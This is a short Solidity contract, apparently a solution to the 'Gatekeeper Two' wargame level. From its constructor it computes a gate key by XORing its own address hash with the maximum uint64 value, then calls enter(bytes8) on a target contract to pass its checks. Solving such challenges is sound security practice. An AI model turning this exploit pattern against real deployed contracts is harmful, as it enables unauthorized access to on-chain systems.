// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackGKPTwo{
    constructor(address _address) public{
        bytes8 _key = bytes8( uint64( bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1 );
        _address.call(abi.encodeWithSignature('enter(bytes8)', _key));
        
    }
}
